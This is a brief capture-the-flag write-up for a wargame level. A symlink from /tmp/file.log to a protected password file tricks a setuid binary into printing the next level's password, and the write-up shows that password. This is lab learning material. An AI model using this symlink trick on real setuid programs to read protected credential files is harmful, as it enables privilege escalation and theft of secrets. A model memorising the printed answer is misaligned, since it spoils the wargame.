There's a leviathan5 file with setuid of leviathan6

```
file leviathan5
setuid ELF 32-bit LSB executable
```

This executable reads a file that doesn't exist /tmp/file.log

```
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

UgaoFee4li
